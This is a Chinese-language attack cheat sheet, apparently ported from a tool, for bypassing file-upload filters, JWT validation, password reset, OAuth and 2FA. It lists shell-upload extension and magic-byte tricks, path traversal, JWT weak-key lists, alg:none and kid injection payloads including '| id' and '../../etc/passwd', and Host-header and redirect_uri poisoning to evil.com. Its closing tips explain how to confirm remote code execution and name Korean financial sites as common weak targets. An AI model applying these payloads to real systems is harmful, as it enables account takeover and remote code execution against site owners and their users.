# Upload / Auth / 2FA / JWT Bypass — 从 bingo v7.0.66 移植

## 1. 文件上传绕过矩阵

### 扩展名绕过
```
php:  php, php3, php4, php5, php7, phtml, pht, php.jpg, php%00.jpg, php\x00.jpg,
      PHP, Php, pHp, php.bak, php.old, .php., .php_, php::$DATA (NTFS ADS)
asp:  asp, aspx, ascx, ashx, asmx, asp.jpg, aspx%00.jpg, ASP, ASPX, asp::$DATA
jsp:  jsp, jspa, jsps, jspx, jsp.jpg, JSP
```

### MIME 伪装
```
php shell + image/jpeg | image/png | image/gif | image/webp | text/plain | application/octet-stream
```

### Magic Bytes 表
```
jpg:  \xff\xd8\xff\xe0
png:  \x89PNG\r\n\x1a\n
gif:  GIF89a
pdf:  %PDF-1.
zip:  PK\x03\x04
bmp:  BM
用法: magic + b"\n" + shell_code
```

### Content-Disposition 分拆
```
filename="shell.php; filename=shell.jpg"  ← 前端校验第一个，后端用第二个
```

### 路径穿越上传
```
../../shell.php
```

### 上传目录字典 (韩站)
```
/uploads/ /upload/ /files/ /images/ /static/ /media/ /board/ /bbs/ /data/
```

## 2. JWT 攻击

### 常见弱密钥 (HS256 爆破)
```
secret secret123 password admin test key your-256-bit-secret your-secret-key
jwt-secret HS256 changeme 1234567890 qwerty abc123 super-secret mysecretkey
secretkey private-key mysecret mykey token letmein your_jwt_secret supersecret
jwtkey apikey api_secret app_secret flask_secret django_secret "" null undefined
false true 0 1 RS256 secret123 password123
```

### alg:none 构造
```
header {"alg":"none"} + payload + 空签名
token = b64(header) + "." + b64(payload) + "."
```

### kid 注入
```
"kid": "/../../../dev/null" (key=空文件)
"kid": "../../etc/passwd"
"kid": "' OR '1'='1"
"kid": "| id"
```

### 管理员 payload 修改
```
role/roles/is_admin/admin/is_superuser/type/group → true / "admin" / append "admin"
exp → time+365天
RS256→HS256: 公钥当 HMAC 密钥签名 (无公钥 fallback alg=none)
```

## 3. 密码重置攻击
```
① Host Header Injection: Host: evil.com → 重置链接指向攻击者域
② X-Forwarded-Host: evil.com
③ 邮箱大小写变体: user@x.com → USER@X.COM (同一账号 token 复用)
④ 邮箱 +tag: user+test@x.com (发送到原账号)
⑤ 响应操纵: {"success": false} → true
⑥ Token 复用: 同一 token 用两次不失效
```

## 4. OAuth 测试用例
```
redirect_uri 操纵: https://evil.com/callback
                   redirect_uri + ".evil.com"
                   https://evil.com@real.com/callback
                   /同路径/evil
state CSRF: state 参数不校验
open redirect 链: next=https://evil.com
```

## 5. 会话 token 弱点分析
```
^[a-f0-9]{32}$ → MD5 hash (可预测)
^\d+$ → 数字序列 (可枚举)
^[a-zA-Z0-9]{8,16}$ → 短字母数字 (可爆破)
^[a-f0-9]{40}$ → SHA1
<16字符 → 太短 | 唯一字符<10 → 低熵
base64 解码含 user|id|name|role|admin → 敏感数据
```

## 6. 2FA/OTP 绕过
```
弱 OTP: 000000 111111 123456 654321 000001 999999 123123 112233
判定: 200/302 + success|welcome|dashboard|home|로그인|완료
响应操纵: "success":false / "verified":false / "valid":false → Burp 改成 true
OTP 复用: 同一 OTP 两次 200 且无 error/invalid → 未失效
备份码泄露: 8位hex/8位数字/XXXX-XXXX 模式 ≥3 个 → CRITICAL
步骤跳过: 用第一步会话 cookie 直连受保护页, 200 且无 otp/2fa/verify → 可跳过
MFA 弱码: "" 000000 123456 111111 999999 0 1 + 直接访问 + JSON 操纵
```

## 7. 登录表单自动分析
```
用户名判定: type="password" 的 input 之前的第一个 text/email input
form action 相对路径 → 拼 base origin
hidden input 全量回填 (8条 CSRF 正则见 02-korean-cms 文档)
```

## 8. 实战要点
- 上传 payload 最多试 10 个变体，2xx 后必须访问确认 + ?cmd=echo PWNED 验证 RCE
- JWT 优先试弱密钥（字典小命中率高），再 alg:none
- 2FA 步骤跳过是韩国金融站常见缺口 (session 在 step1 就建立)
- OTP 爆破前先测 rate limit
